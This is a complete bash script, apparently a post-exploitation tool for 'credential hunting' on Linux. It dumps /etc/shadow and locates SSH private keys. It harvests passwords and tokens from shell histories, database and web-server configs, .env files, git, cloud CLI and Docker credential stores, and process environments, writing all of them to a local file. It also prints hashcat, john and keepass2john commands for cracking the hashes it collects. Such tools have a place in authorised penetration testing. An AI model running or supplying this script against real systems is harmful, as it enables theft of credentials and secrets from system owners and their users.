#!/bin/bash
# Automated Credential Hunting on Linux
# Usage: ./credential_hunt.sh [output_file]

OUTPUT="${1:-/tmp/cred_hunt_$(date +%Y%m%d_%H%M%S).txt}"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

header() { echo -e "\n${GREEN}=== $1 ===${NC}"; echo -e "\n=== $1 ===" >> "$OUTPUT"; }
finding() { echo -e "${RED}[!] $1${NC}"; echo "[!] $1" >> "$OUTPUT"; }
run() { echo -e "\n--- $1 ---" >> "$OUTPUT"; eval "$2" 2>/dev/null >> "$OUTPUT"; }

echo "Credential Hunt — $(date)" | tee "$OUTPUT"

# ── /etc/shadow ──
header "Shadow File"
if [ -r /etc/shadow ]; then
    finding "/etc/shadow is READABLE"
    run "Shadow" "cat /etc/shadow"
    echo -e "${YELLOW}[*] Crack with: john shadow --wordlist=rockyou.txt${NC}"
    echo -e "${YELLOW}[*] Or: hashcat -m 1800 shadow rockyou.txt${NC}"
fi

# ── SSH Private Keys ──
header "SSH Private Keys"
KEYS=$(find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'id_dsa' -o -name '*.pem' -o -name '*.key' 2>/dev/null | grep -vE '/proc|/snap|/usr/share/doc')
if [ -n "$KEYS" ]; then
    for k in $KEYS; do
        if head -1 "$k" 2>/dev/null | grep -qE 'PRIVATE KEY|ENCRYPTED'; then
            finding "Private key: $k"
            run "Key Header ($k)" "head -3 '$k'"
            PERMS=$(stat -c '%a' "$k" 2>/dev/null)
            [ "$PERMS" != "600" ] && [ "$PERMS" != "400" ] && finding "  Weak permissions: $PERMS"
        fi
    done
fi

# ── Shell History ──
header "Shell History Files"
for home in /root /home/*; do
    for hist in .bash_history .zsh_history .sh_history .mysql_history .psql_history .python_history .node_repl_history .lesshst; do
        FILE="$home/$hist"
        [ -f "$FILE" ] && [ -r "$FILE" ] || continue
        finding "History: $FILE"
        SECRETS=$(grep -inE 'password|passwd|pwd=|secret|token|api_key|mysql.*-p|psql.*-W|ssh.*-i|curl.*-u|wget.*--password|sshpass' "$FILE" 2>/dev/null | head -10)
        if [ -n "$SECRETS" ]; then
            finding "  Credentials in history:"
            echo "$SECRETS" >> "$OUTPUT"
        fi
    done
done

# ── Configuration Files ──
header "Application Configuration Files"

# MySQL / MariaDB
for f in /etc/mysql/my.cnf /etc/my.cnf ~/.my.cnf /var/www/*/wp-config.php; do
    [ -f "$f" ] && [ -r "$f" ] || continue
    CREDS=$(grep -iE 'password|passwd|DB_PASSWORD' "$f" 2>/dev/null | grep -v '^#' | head -5)
    if [ -n "$CREDS" ]; then
        finding "MySQL creds in $f"
        echo "$CREDS" >> "$OUTPUT"
    fi
done

# PostgreSQL
for f in /var/lib/postgresql/.pgpass ~/.pgpass /etc/postgresql/*/main/pg_hba.conf; do
    [ -f "$f" ] && [ -r "$f" ] || continue
    finding "PostgreSQL config: $f"
    run "PostgreSQL ($f)" "cat '$f'"
done

# Redis
for f in /etc/redis/redis.conf /etc/redis.conf; do
    [ -f "$f" ] && [ -r "$f" ] || continue
    PASS=$(grep '^requirepass' "$f" 2>/dev/null)
    [ -n "$PASS" ] && finding "Redis password in $f: $PASS"
done

# MongoDB
for f in /etc/mongod.conf /etc/mongodb.conf; do
    [ -f "$f" ] && [ -r "$f" ] || continue
    finding "MongoDB config: $f"
    run "MongoDB ($f)" "grep -A5 'security\|auth' '$f'"
done

# Apache / Nginx
for f in /etc/apache2/sites-enabled/* /etc/nginx/sites-enabled/* /etc/httpd/conf.d/*; do
    [ -f "$f" ] && [ -r "$f" ] || continue
    HTPASSWD=$(grep -i 'AuthUserFile\|auth_basic_user_file' "$f" 2>/dev/null | grep -oP '/\S+')
    for hp in $HTPASSWD; do
        [ -f "$hp" ] && [ -r "$hp" ] && finding "htpasswd: $hp" && run "htpasswd" "cat '$hp'"
    done
done

# WordPress
find / -name 'wp-config.php' -readable 2>/dev/null | while read -r f; do
    finding "WordPress config: $f"
    run "WP Config" "grep -E 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY|SECURE_AUTH' '$f'"
done

# Django
find / -name 'settings.py' -path '*/django*' -o -name 'settings.py' -path '*/project*' 2>/dev/null | head -5 | while read -r f; do
    [ -r "$f" ] || continue
    CREDS=$(grep -iE 'SECRET_KEY|PASSWORD|DATABASE' "$f" 2>/dev/null | head -10)
    [ -n "$CREDS" ] && finding "Django settings: $f" && echo "$CREDS" >> "$OUTPUT"
done

# ── .env Files ──
header "Environment Files (.env)"
find / -name '.env' -o -name '.env.local' -o -name '.env.production' -o -name '.env.staging' -o -name '.env.development' 2>/dev/null | grep -vE '/proc|/sys|/snap|node_modules' | while read -r f; do
    [ -r "$f" ] || continue
    finding ".env file: $f"
    run "Env ($f)" "grep -iE 'password|secret|token|key|api|database_url|redis_url|mongo|smtp' '$f'"
done

# ── Git Credentials ──
header "Git Credentials"
find / -name '.git-credentials' -readable 2>/dev/null | while read -r f; do
    finding "Git credentials: $f"
    run "Git Creds" "cat '$f'"
done
find / -name '.gitconfig' -readable 2>/dev/null | while read -r f; do
    CREDS=$(grep -iE 'password|token|credential' "$f" 2>/dev/null)
    [ -n "$CREDS" ] && finding "Git config creds: $f"
done

# ── Cloud CLI Credentials ──
header "Cloud Provider Credentials"

# AWS
for f in ~/.aws/credentials /root/.aws/credentials /home/*/.aws/credentials; do
    [ -f "$f" ] && [ -r "$f" ] && finding "AWS credentials: $f" && run "AWS" "cat '$f'"
done

# GCP
for f in ~/.config/gcloud/application_default_credentials.json /root/.config/gcloud/application_default_credentials.json; do
    [ -f "$f" ] && [ -r "$f" ] && finding "GCP credentials: $f" && run "GCP" "cat '$f'"
done

# Azure
for f in ~/.azure/accessTokens.json /root/.azure/accessTokens.json; do
    [ -f "$f" ] && [ -r "$f" ] && finding "Azure tokens: $f"
done

# ── Docker Credentials ──
header "Docker Credentials"
for f in ~/.docker/config.json /root/.docker/config.json /home/*/.docker/config.json; do
    [ -f "$f" ] && [ -r "$f" ] || continue
    if grep -q '"auth"' "$f" 2>/dev/null; then
        finding "Docker registry auth: $f"
        run "Docker" "grep -A2 '\"auth\"' '$f'"
        echo -e "${YELLOW}[*] Decode: echo '<auth_value>' | base64 -d${NC}"
    fi
done

# ── GPG Keys ──
header "GPG Keys"
find / -name '*.gpg' -o -name 'secring.*' -o -name 'trustdb.*' 2>/dev/null | grep -v '/proc' | while read -r f; do
    [ -r "$f" ] && finding "GPG data: $f"
done

# ── KeePass Databases ──
header "Password Managers"
find / -name '*.kdbx' -o -name '*.kdb' 2>/dev/null | while read -r f; do
    finding "KeePass database: $f"
    echo -e "${YELLOW}[*] Crack with: keepass2john $f > hash && john hash --wordlist=rockyou.txt${NC}"
done

# ── Generic Credential Search ──
header "Generic Credential Patterns"
SEARCH_DIRS="/etc /opt /var/www /var/lib /srv /usr/local /home /root"
for dir in $SEARCH_DIRS; do
    [ -d "$dir" ] || continue
    grep -rlsiE 'password\s*[:=]|passwd\s*[:=]|secret\s*[:=]|api_key\s*[:=]|apikey\s*[:=]|token\s*[:=]|credentials' "$dir" 2>/dev/null | \
        grep -vE '\.git/|node_modules|\.pyc$|\.so$|\.o$|Binary|/proc|/sys' | head -20 | while read -r f; do
        echo "  [*] $f" >> "$OUTPUT"
    done
done

# ── Process Environment Variables ──
header "Process Environment Secrets"
for pid in $(ls /proc/ 2>/dev/null | grep '^[0-9]' | head -50); do
    ENV=$(cat "/proc/$pid/environ" 2>/dev/null | tr '\0' '\n' | grep -iE 'password|secret|token|api_key|database_url')
    if [ -n "$ENV" ]; then
        PROC_NAME=$(cat "/proc/$pid/comm" 2>/dev/null)
        finding "Secrets in environment of PID $pid ($PROC_NAME)"
        echo "$ENV" >> "$OUTPUT"
    fi
done

echo -e "\n${GREEN}Credential hunt complete. Output: $OUTPUT${NC}"
